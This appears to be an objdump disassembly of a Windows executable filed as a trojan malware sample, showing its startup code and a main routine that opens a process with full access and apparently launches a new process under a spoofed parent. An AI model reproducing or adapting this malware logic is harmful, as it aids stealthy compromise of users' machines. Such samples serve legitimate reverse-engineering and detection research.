
malware_samples/trojan/08214c655b2e5f2b77226e781f40cf61dd8cc09e54642689a3af092f4c50f9cb.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8b c4             	mov    %rsp,%rax
   140001003:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001007:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000100b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000100f:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140001013:	55                   	push   %rbp
   140001014:	41 56                	push   %r14
   140001016:	41 57                	push   %r15
   140001018:	48 8d 68 88          	lea    -0x78(%rax),%rbp
   14000101c:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140001023:	48 8b 05 d6 8f 01 00 	mov    0x18fd6(%rip),%rax        # 0x14001a000
   14000102a:	48 33 c4             	xor    %rsp,%rax
   14000102d:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140001031:	48 8d 15 48 68 01 00 	lea    0x16848(%rip),%rdx        # 0x140017880
   140001038:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   14000103c:	ff 15 3e f2 00 00    	call   *0xf23e(%rip)        # 0x140010280
   140001042:	48 8d 15 77 68 01 00 	lea    0x16877(%rip),%rdx        # 0x1400178c0
   140001049:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   14000104d:	ff 15 2d f2 00 00    	call   *0xf22d(%rip)        # 0x140010280
   140001053:	48 83 64 24 68 00    	andq   $0x0,0x68(%rsp)
   140001059:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   14000105d:	bf 01 00 00 00       	mov    $0x1,%edi
   140001062:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   140001066:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   14000106a:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000106f:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140001075:	45 33 c9             	xor    %r9d,%r9d
   140001078:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000107e:	45 33 c0             	xor    %r8d,%r8d
   140001081:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001087:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000108d:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140001093:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001098:	ff 15 d2 f1 00 00    	call   *0xf1d2(%rip)        # 0x140010270
   14000109e:	8d 5f 57             	lea    0x57(%rdi),%ebx
   1400010a1:	33 d2                	xor    %edx,%edx
   1400010a3:	44 8b c3             	mov    %ebx,%r8d
   1400010a6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400010aa:	e8 c1 de 00 00       	call   0x14000ef70
   1400010af:	83 65 f8 00          	andl   $0x0,-0x8(%rbp)
   1400010b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400010b6:	48 89 5d f0          	mov    %rbx,-0x10(%rbp)
   1400010ba:	33 c0                	xor    %eax,%eax
   1400010bc:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   1400010c0:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400010c4:	8d 5f 07             	lea    0x7(%rdi),%ebx
   1400010c7:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   1400010cb:	89 7d 00             	mov    %edi,0x0(%rbp)
   1400010ce:	44 8b c3             	mov    %ebx,%r8d
   1400010d1:	c7 45 a8 30 00 00 00 	movl   $0x30,-0x58(%rbp)
   1400010d8:	8b d3                	mov    %ebx,%edx
   1400010da:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400010e1:	00 00 
   1400010e3:	48 8b 48 60          	mov    0x60(%rax),%rcx
   1400010e7:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   1400010eb:	ff 15 a7 f1 00 00    	call   *0xf1a7(%rip)        # 0x140010298
   1400010f1:	65 48 8b 0c 25 30 00 	mov    %gs:0x30,%rcx
   1400010f8:	00 00 
   1400010fa:	44 8d 47 1f          	lea    0x1f(%rdi),%r8d
   1400010fe:	8b d3                	mov    %ebx,%edx
   140001100:	48 8b f0             	mov    %rax,%rsi
   140001103:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140001107:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   14000110b:	ff 15 87 f1 00 00    	call   *0xf187(%rip)        # 0x140010298
   140001111:	65 48 8b 0c 25 30 00 	mov    %gs:0x30,%rcx
   140001118:	00 00 
   14000111a:	44 8d 67 3f          	lea    0x3f(%rdi),%r12d
   14000111e:	45 8b c4             	mov    %r12d,%r8d
   140001121:	8b d3                	mov    %ebx,%edx
   140001123:	4c 8b f0             	mov    %rax,%r14
   140001126:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   14000112a:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   14000112e:	ff 15 64 f1 00 00    	call   *0xf164(%rip)        # 0x140010298
   140001134:	65 48 8b 0c 25 30 00 	mov    %gs:0x30,%rcx
   14000113b:	00 00 
   14000113d:	bf c8 00 00 00       	mov    $0xc8,%edi
   140001142:	44 8b c7             	mov    %edi,%r8d
   140001145:	8b d3                	mov    %ebx,%edx
   140001147:	4c 8b f8             	mov    %rax,%r15
   14000114a:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   14000114e:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   140001152:	ff 15 40 f1 00 00    	call   *0xf140(%rip)        # 0x140010298
   140001158:	48 8b d8             	mov    %rax,%rbx
   14000115b:	48 89 38             	mov    %rdi,(%rax)
   14000115e:	4c 89 60 30          	mov    %r12,0x30(%rax)
   140001162:	41 bc 08 00 00 00    	mov    $0x8,%r12d
   140001168:	48 c7 40 08 03 00 01 	movq   $0x10003,0x8(%rax)
   14000116f:	00 
   140001170:	48 c7 40 10 10 00 00 	movq   $0x10,0x10(%rax)
   140001177:	00 
   140001178:	4c 89 70 18          	mov    %r14,0x18(%rax)
   14000117c:	48 c7 40 28 06 00 00 	movq   $0x6,0x28(%rax)
   140001183:	00 
   140001184:	4c 89 78 38          	mov    %r15,0x38(%rax)
   140001188:	48 c7 40 48 05 00 02 	movq   $0x20005,0x48(%rax)
   14000118f:	00 
   140001190:	0f b7 4d 80          	movzwl -0x80(%rbp),%ecx
   140001194:	48 89 48 50          	mov    %rcx,0x50(%rax)
   140001198:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
   14000119c:	48 89 48 58          	mov    %rcx,0x58(%rax)
   1400011a0:	48 c7 40 68 0a 00 02 	movq   $0x2000a,0x68(%rax)
   1400011a7:	00 
   1400011a8:	4c 89 60 70          	mov    %r12,0x70(%rax)
   1400011ac:	48 89 70 78          	mov    %rsi,0x78(%rax)
   1400011b0:	48 8d 0d 51 67 01 00 	lea    0x16751(%rip),%rcx        # 0x140017908
   1400011b7:	48 b8 00 00 00 00 00 	movabs $0x100000000000,%rax
   1400011be:	10 00 00 
   1400011c1:	33 d2                	xor    %edx,%edx
   1400011c3:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   1400011c7:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   1400011cb:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   1400011d2:	48 c7 83 88 00 00 00 	movq   $0x20010,0x88(%rbx)
   1400011d9:	10 00 02 00 
   1400011dd:	4c 89 a3 90 00 00 00 	mov    %r12,0x90(%rbx)
   1400011e4:	ff 15 76 f0 00 00    	call   *0xf076(%rip)        # 0x140010260
   1400011ea:	48 8b c8             	mov    %rax,%rcx
   1400011ed:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400011f2:	ff 15 60 f0 00 00    	call   *0xf060(%rip)        # 0x140010258
   1400011f8:	44 8b 44 24 60       	mov    0x60(%rsp),%r8d
   1400011fd:	33 d2                	xor    %edx,%edx
   1400011ff:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   140001204:	ff 15 f6 ed 00 00    	call   *0xedf6(%rip)        # 0x140010000
   14000120a:	48 8b f8             	mov    %rax,%rdi
   14000120d:	48 85 c0             	test   %rax,%rax
   140001210:	74 1b                	je     0x14000122d
   140001212:	48 c7 83 a8 00 00 00 	movq   $0x60000,0xa8(%rbx)
   140001219:	00 00 06 00 
   14000121d:	4c 89 a3 b0 00 00 00 	mov    %r12,0xb0(%rbx)
   140001224:	48 89 83 b8 00 00 00 	mov    %rax,0xb8(%rbx)
   14000122b:	eb 04                	jmp    0x140001231
   14000122d:	48 83 03 e0          	addq   $0xffffffffffffffe0,(%rbx)
   140001231:	48 83 64 24 78 00    	andq   $0x0,0x78(%rsp)
   140001237:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000123b:	48 83 64 24 70 00    	andq   $0x0,0x70(%rsp)
   140001241:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001246:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000124b:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140001250:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001255:	41 b8 00 00 00 02    	mov    $0x2000000,%r8d
   14000125b:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140001260:	45 8b c8             	mov    %r8d,%r9d
   140001263:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001268:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
   14000126c:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   140001271:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140001276:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000127b:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
   14000127f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001284:	ff 15 06 f0 00 00    	call   *0xf006(%rip)        # 0x140010290
   14000128a:	48 85 ff             	test   %rdi,%rdi
   14000128d:	74 09                	je     0x140001298
   14000128f:	48 8b cf             	mov    %rdi,%rcx
   140001292:	ff 15 70 ed 00 00    	call   *0xed70(%rip)        # 0x140010008
   140001298:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   14000129f:	00 00 
   1400012a1:	4c 8b c3             	mov    %rbx,%r8
   1400012a4:	33 d2                	xor    %edx,%edx
   1400012a6:	48 8b 48 60          	mov    0x60(%rax),%rcx
   1400012aa:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   1400012ae:	ff 15 c4 ef 00 00    	call   *0xefc4(%rip)        # 0x140010278
   1400012b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400012bb:	00 00 
   1400012bd:	4c 8b c6             	mov    %rsi,%r8
   1400012c0:	33 d2                	xor    %edx,%edx
   1400012c2:	48 8b 48 60          	mov    0x60(%rax),%rcx
   1400012c6:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   1400012ca:	ff 15 a8 ef 00 00    	call   *0xefa8(%rip)        # 0x140010278
   1400012d0:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400012d7:	00 00 
   1400012d9:	4d 8b c6             	mov    %r14,%r8
   1400012dc:	33 d2                	xor    %edx,%edx
   1400012de:	48 8b 48 60          	mov    0x60(%rax),%rcx
   1400012e2:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   1400012e6:	ff 15 8c ef 00 00    	call   *0xef8c(%rip)        # 0x140010278
   1400012ec:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400012f3:	00 00 
   1400012f5:	4d 8b c7             	mov    %r15,%r8
   1400012f8:	33 d2                	xor    %edx,%edx
   1400012fa:	48 8b 48 60          	mov    0x60(%rax),%rcx
   1400012fe:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   140001302:	ff 15 70 ef 00 00    	call   *0xef70(%rip)        # 0x140010278
   140001308:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000130d:	ff 15 75 ef 00 00    	call   *0xef75(%rip)        # 0x140010288
   140001313:	33 c0                	xor    %eax,%eax
   140001315:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140001319:	48 33 cc             	xor    %rsp,%rcx
   14000131c:	e8 3f 00 00 00       	call   0x140001360
   140001321:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140001328:	00 
   140001329:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000132d:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001331:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140001335:	4d 8b 63 38          	mov    0x38(%r11),%r12
   140001339:	49 8b e3             	mov    %r11,%rsp
   14000133c:	41 5f                	pop    %r15
   14000133e:	41 5e                	pop    %r14
   140001340:	5d                   	pop    %rbp
   140001341:	c3                   	ret
   140001342:	cc                   	int3
   140001343:	cc                   	int3
   140001344:	cc                   	int3
   140001345:	cc                   	int3
   140001346:	cc                   	int3
   140001347:	cc                   	int3
   140001348:	cc                   	int3
   140001349:	cc                   	int3
   14000134a:	cc                   	int3
   14000134b:	cc                   	int3
   14000134c:	cc                   	int3
   14000134d:	cc                   	int3
   14000134e:	cc                   	int3
   14000134f:	cc                   	int3
   140001350:	cc                   	int3
   140001351:	cc                   	int3
   140001352:	cc                   	int3
   140001353:	cc                   	int3
   140001354:	cc                   	int3
   140001355:	cc                   	int3
   140001356:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000135d:	00 00 00 
   140001360:	48 3b 0d 99 8c 01 00 	cmp    0x18c99(%rip),%rcx        # 0x14001a000
   140001367:	75 10                	jne    0x140001379
   140001369:	48 c1 c1 10          	rol    $0x10,%rcx
   14000136d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001372:	75 01                	jne    0x140001375
   140001374:	c3                   	ret
   140001375:	48 c1 c9 10          	ror    $0x10,%rcx
   140001379:	e9 aa 02 00 00       	jmp    0x140001628
   14000137e:	cc                   	int3
   14000137f:	cc                   	int3
   140001380:	40 53                	rex push %rbx
   140001382:	48 83 ec 20          	sub    $0x20,%rsp
   140001386:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000138b:	e8 ec 36 00 00       	call   0x140004a7c
   140001390:	e8 f7 07 00 00       	call   0x140001b8c
   140001395:	8b c8                	mov    %eax,%ecx
   140001397:	e8 7c 42 00 00       	call   0x140005618
   14000139c:	e8 df 07 00 00       	call   0x140001b80
   1400013a1:	8b d8                	mov    %eax,%ebx
   1400013a3:	e8 34 44 00 00       	call   0x1400057dc
   1400013a8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400013ad:	89 18                	mov    %ebx,(%rax)
   1400013af:	e8 58 05 00 00       	call   0x14000190c
   1400013b4:	84 c0                	test   %al,%al
   1400013b6:	74 73                	je     0x14000142b
   1400013b8:	e8 4f 0a 00 00       	call   0x140001e0c
   1400013bd:	48 8d 0d 84 0a 00 00 	lea    0xa84(%rip),%rcx        # 0x140001e48
   1400013c4:	e8 f3 06 00 00       	call   0x140001abc
   1400013c9:	e8 b6 07 00 00       	call   0x140001b84
   1400013ce:	8b c8                	mov    %eax,%ecx
   1400013d0:	e8 63 39 00 00       	call   0x140004d38
   1400013d5:	85 c0                	test   %eax,%eax
   1400013d7:	75 52                	jne    0x14000142b
   1400013d9:	e8 b6 07 00 00       	call   0x140001b94
   1400013de:	e8 f5 07 00 00       	call   0x140001bd8
   1400013e3:	85 c0                	test   %eax,%eax
   1400013e5:	74 0c                	je     0x1400013f3
   1400013e7:	48 8d 0d 92 07 00 00 	lea    0x792(%rip),%rcx        # 0x140001b80
   1400013ee:	e8 f5 36 00 00       	call   0x140004ae8
   1400013f3:	e8 b0 07 00 00       	call   0x140001ba8
   1400013f8:	e8 ab 07 00 00       	call   0x140001ba8
   1400013fd:	e8 7e 07 00 00       	call   0x140001b80
   140001402:	8b c8                	mov    %eax,%ecx
   140001404:	e8 33 43 00 00       	call   0x14000573c
   140001409:	e8 96 07 00 00       	call   0x140001ba4
   14000140e:	84 c0                	test   %al,%al
   140001410:	74 05                	je     0x140001417
   140001412:	e8 59 3e 00 00       	call   0x140005270
   140001417:	e8 64 07 00 00       	call   0x140001b80
   14000141c:	e8 23 09 00 00       	call   0x140001d44
   140001421:	85 c0                	test   %eax,%eax
   140001423:	75 06                	jne    0x14000142b
   140001425:	48 83 c4 20          	add    $0x20,%rsp
   140001429:	5b                   	pop    %rbx
   14000142a:	c3                   	ret
   14000142b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001430:	e8 c7 07 00 00       	call   0x140001bfc
   140001435:	cc                   	int3
   140001436:	cc                   	int3
   140001437:	cc                   	int3
   140001438:	48 83 ec 28          	sub    $0x28,%rsp
   14000143c:	e8 7b 07 00 00       	call   0x140001bbc
   140001441:	33 c0                	xor    %eax,%eax
   140001443:	48 83 c4 28          	add    $0x28,%rsp
   140001447:	c3                   	ret
   140001448:	48 83 ec 28          	sub    $0x28,%rsp
   14000144c:	e8 4f 09 00 00       	call   0x140001da0
   140001451:	e8 2a 07 00 00       	call   0x140001b80
   140001456:	8b c8                	mov    %eax,%ecx
   140001458:	48 83 c4 28          	add    $0x28,%rsp
   14000145c:	e9 4f 43 00 00       	jmp    0x1400057b0
   140001461:	cc                   	int3
   140001462:	cc                   	int3
   140001463:	cc                   	int3
   140001464:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001469:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000146e:	57                   	push   %rdi
   14000146f:	48 83 ec 30          	sub    $0x30,%rsp
   140001473:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001478:	e8 53 04 00 00       	call   0x1400018d0
   14000147d:	84 c0                	test   %al,%al
   14000147f:	0f 84 36 01 00 00    	je     0x1400015bb
   140001485:	40 32 f6             	xor    %sil,%sil
   140001488:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   14000148d:	e8 02 04 00 00       	call   0x140001894
   140001492:	8a d8                	mov    %al,%bl
   140001494:	8b 0d 76 9b 01 00    	mov    0x19b76(%rip),%ecx        # 0x14001b010
   14000149a:	83 f9 01             	cmp    $0x1,%ecx
   14000149d:	0f 84 23 01 00 00    	je     0x1400015c6
   1400014a3:	85 c9                	test   %ecx,%ecx
   1400014a5:	75 4a                	jne    0x1400014f1
   1400014a7:	c7 05 5f 9b 01 00 01 	movl   $0x1,0x19b5f(%rip)        # 0x14001b010
   1400014ae:	00 00 00 
   1400014b1:	48 8d 15 78 ee 00 00 	lea    0xee78(%rip),%rdx        # 0x140010330
   1400014b8:	48 8d 0d 39 ee 00 00 	lea    0xee39(%rip),%rcx        # 0x1400102f8
   1400014bf:	e8 f8 3d 00 00       	call   0x1400052bc
   1400014c4:	85 c0                	test   %eax,%eax
   1400014c6:	74 0a                	je     0x1400014d2
   1400014c8:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400014cd:	e9 d9 00 00 00       	jmp    0x1400015ab
   1400014d2:	48 8d 15 17 ee 00 00 	lea    0xee17(%rip),%rdx        # 0x1400102f0
   1400014d9:	48 8d 0d 00 ee 00 00 	lea    0xee00(%rip),%rcx        # 0x1400102e0
   1400014e0:	e8 93 3d 00 00       	call   0x140005278
   1400014e5:	c7 05 21 9b 01 00 02 	movl   $0x2,0x19b21(%rip)        # 0x14001b010
   1400014ec:	00 00 00 
   1400014ef:	eb 08                	jmp    0x1400014f9
   1400014f1:	40 b6 01             	mov    $0x1,%sil
   1400014f4:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   1400014f9:	8a cb                	mov    %bl,%cl
   1400014fb:	e8 30 05 00 00       	call   0x140001a30
   140001500:	e8 df 06 00 00       	call   0x140001be4
   140001505:	48 8b d8             	mov    %rax,%rbx
   140001508:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000150c:	74 1e                	je     0x14000152c
   14000150e:	48 8b c8             	mov    %rax,%rcx
   140001511:	e8 82 04 00 00       	call   0x140001998
   140001516:	84 c0                	test   %al,%al
   140001518:	74 12                	je     0x14000152c
   14000151a:	45 33 c0             	xor    %r8d,%r8d
   14000151d:	41 8d 50 02          	lea    0x2(%r8),%edx
   140001521:	33 c9                	xor    %ecx,%ecx
   140001523:	48 8b 03             	mov    (%rbx),%rax
   140001526:	ff 15 8c ed 00 00    	call   *0xed8c(%rip)        # 0x1400102b8
   14000152c:	e8 bb 06 00 00       	call   0x140001bec
   140001531:	48 8b d8             	mov    %rax,%rbx
   140001534:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001538:	74 14                	je     0x14000154e
   14000153a:	48 8b c8             	mov    %rax,%rcx
   14000153d:	e8 56 04 00 00       	call   0x140001998
   140001542:	84 c0                	test   %al,%al
   140001544:	74 08                	je     0x14000154e
   140001546:	48 8b 0b             	mov    (%rbx),%rcx
   140001549:	e8 7e 40 00 00       	call   0x1400055cc
   14000154e:	e8 cd 3c 00 00       	call   0x140005220
   140001553:	48 8b f8             	mov    %rax,%rdi
   140001556:	e8 2d 41 00 00       	call   0x140005688
   14000155b:	48 8b 18             	mov    (%rax),%rbx
   14000155e:	e8 1d 41 00 00       	call   0x140005680
   140001563:	4c 8b c7             	mov    %rdi,%r8
   140001566:	48 8b d3             	mov    %rbx,%rdx
   140001569:	8b 08                	mov    (%rax),%ecx
   14000156b:	e8 90 fa ff ff       	call   0x140001000
   140001570:	8b d8                	mov    %eax,%ebx
   140001572:	e8 d5 07 00 00       	call   0x140001d4c
   140001577:	84 c0                	test   %al,%al
   140001579:	74 55                	je     0x1400015d0
   14000157b:	40 84 f6             	test   %sil,%sil
   14000157e:	75 05                	jne    0x140001585
   140001580:	e8 2b 40 00 00       	call   0x1400055b0
   140001585:	33 d2                	xor    %edx,%edx
   140001587:	b1 01                	mov    $0x1,%cl
   140001589:	e8 c6 04 00 00       	call   0x140001a54
   14000158e:	8b c3                	mov    %ebx,%eax
   140001590:	eb 19                	jmp    0x1400015ab
   140001592:	8b d8                	mov    %eax,%ebx
   140001594:	e8 b3 07 00 00       	call   0x140001d4c
   140001599:	84 c0                	test   %al,%al
   14000159b:	74 3b                	je     0x1400015d8
   14000159d:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   1400015a2:	75 05                	jne    0x1400015a9
   1400015a4:	e8 f7 3f 00 00       	call   0x1400055a0
   1400015a9:	8b c3                	mov    %ebx,%eax
   1400015ab:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400015b0:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400015b5:	48 83 c4 30          	add    $0x30,%rsp
   1400015b9:	5f                   	pop    %rdi
   1400015ba:	c3                   	ret
   1400015bb:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400015c0:	e8 37 06 00 00       	call   0x140001bfc
   1400015c5:	90                   	nop
   1400015c6:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400015cb:	e8 2c 06 00 00       	call   0x140001bfc
   1400015d0:	8b cb                	mov    %ebx,%ecx
   1400015d2:	e8 35 40 00 00       	call   0x14000560c
   1400015d7:	90                   	nop
   1400015d8:	8b cb                	mov    %ebx,%ecx
   1400015da:	e8 e1 3f 00 00       	call   0x1400055c0
   1400015df:	90                   	nop
   1400015e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015e4:	e8 eb 04 00 00       	call   0x140001ad4
   1400015e9:	48 83 c4 28          	add    $0x28,%rsp
   1400015ed:	e9 72 fe ff ff       	jmp    0x140001464
   1400015f2:	cc                   	int3
   1400015f3:	cc                   	int3
   1400015f4:	40 53                	rex push %rbx
   1400015f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400015fa:	48 8b d9             	mov    %rcx,%rbx
   1400015fd:	33 c9                	xor    %ecx,%ecx
   1400015ff:	ff 15 6b ea 00 00    	call   *0xea6b(%rip)        # 0x140010070
   140001605:	48 8b cb             	mov    %rbx,%rcx
   140001608:	ff 15 5a ea 00 00    	call   *0xea5a(%rip)        # 0x140010068
   14000160e:	ff 15 64 ea 00 00    	call   *0xea64(%rip)        # 0x140010078
   140001614:	48 8b c8             	mov    %rax,%rcx
   140001617:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   14000161c:	48 83 c4 20          	add    $0x20,%rsp
   140001620:	5b                   	pop    %rbx
   140001621:	48 ff 25 58 ea 00 00 	rex.W jmp *0xea58(%rip)        # 0x140010080
   140001628:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000162d:	48 83 ec 38          	sub    $0x38,%rsp
   140001631:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001636:	ff 15 4c ea 00 00    	call   *0xea4c(%rip)        # 0x140010088
   14000163c:	85 c0                	test   %eax,%eax
   14000163e:	74 07                	je     0x140001647
   140001640:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001645:	cd 29                	int    $0x29
   140001647:	48 8d 0d f2 94 01 00 	lea    0x194f2(%rip),%rcx        # 0x14001ab40
   14000164e:	e8 cd 01 00 00       	call   0x140001820
   140001653:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001658:	48 89 05 d9 95 01 00 	mov    %rax,0x195d9(%rip)        # 0x14001ac38
   14000165f:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001664:	48 83 c0 08          	add    $0x8,%rax
   140001668:	48 89 05 69 95 01 00 	mov    %rax,0x19569(%rip)        # 0x14001abd8
   14000166f:	48 8b 05 c2 95 01 00 	mov    0x195c2(%rip),%rax        # 0x14001ac38
   140001676:	48 89 05 33 94 01 00 	mov    %rax,0x19433(%rip)        # 0x14001aab0
   14000167d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140001682:	48 89 05 37 95 01 00 	mov    %rax,0x19537(%rip)        # 0x14001abc0
   140001689:	c7 05 0d 94 01 00 09 	movl   $0xc0000409,0x1940d(%rip)        # 0x14001aaa0
   140001690:	04 00 c0 
   140001693:	c7 05 07 94 01 00 01 	movl   $0x1,0x19407(%rip)        # 0x14001aaa4
   14000169a:	00 00 00 
   14000169d:	c7 05 11 94 01 00 01 	movl   $0x1,0x19411(%rip)        # 0x14001aab8
   1400016a4:	00 00 00 
   1400016a7:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016ac:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400016b0:	48 8d 0d 09 94 01 00 	lea    0x19409(%rip),%rcx        # 0x14001aac0
   1400016b7:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400016be:	00 
   1400016bf:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016c4:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400016c8:	48 8b 0d 31 89 01 00 	mov    0x18931(%rip),%rcx        # 0x14001a000
   1400016cf:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400016d4:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016d9:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400016dd:	48 8b 0d 5c 89 01 00 	mov    0x1895c(%rip),%rcx        # 0x14001a040
   1400016e4:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400016e9:	48 8d 0d 80 ec 00 00 	lea    0xec80(%rip),%rcx        # 0x140010370
   1400016f0:	e8 ff fe ff ff       	call   0x1400015f4
   1400016f5:	90                   	nop
   1400016f6:	48 83 c4 38          	add    $0x38,%rsp
   1400016fa:	c3                   	ret
   1400016fb:	cc                   	int3
   1400016fc:	48 83 ec 28          	sub    $0x28,%rsp
   140001700:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001705:	e8 06 00 00 00       	call   0x140001710
   14000170a:	90                   	nop
   14000170b:	48 83 c4 28          	add    $0x28,%rsp
   14000170f:	c3                   	ret
   140001710:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140001714:	48 83 ec 28          	sub    $0x28,%rsp
   140001718:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000171d:	ff 15 65 e9 00 00    	call   *0xe965(%rip)        # 0x140010088
   140001723:	85 c0                	test   %eax,%eax
   140001725:	74 08                	je     0x14000172f
   140001727:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000172b:	8b c8                	mov    %eax,%ecx
   14000172d:	cd 29                	int    $0x29
   14000172f:	48 8d 0d 0a 94 01 00 	lea    0x1940a(%rip),%rcx        # 0x14001ab40
   140001736:	e8 75 00 00 00       	call   0x1400017b0
   14000173b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140001740:	48 89 05 f1 94 01 00 	mov    %rax,0x194f1(%rip)        # 0x14001ac38
   140001747:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   14000174c:	48 83 c0 08          	add    $0x8,%rax
   140001750:	48 89 05 81 94 01 00 	mov    %rax,0x19481(%rip)        # 0x14001abd8
   140001757:	48 8b 05 da 94 01 00 	mov    0x194da(%rip),%rax        # 0x14001ac38
   14000175e:	48 89 05 4b 93 01 00 	mov    %rax,0x1934b(%rip)        # 0x14001aab0
   140001765:	c7 05 31 93 01 00 09 	movl   $0xc0000409,0x19331(%rip)        # 0x14001aaa0
   14000176c:	04 00 c0 
   14000176f:	c7 05 2b 93 01 00 01 	movl   $0x1,0x1932b(%rip)        # 0x14001aaa4
   140001776:	00 00 00 
   140001779:	c7 05 35 93 01 00 01 	movl   $0x1,0x19335(%rip)        # 0x14001aab8
   140001780:	00 00 00 
   140001783:	b8 08 00 00 00       	mov    $0x8,%eax
   140001788:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000178c:	48 8d 0d 2d 93 01 00 	lea    0x1932d(%rip),%rcx        # 0x14001aac0
   140001793:	8b 54 24 30          	mov    0x30(%rsp),%edx
   140001797:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
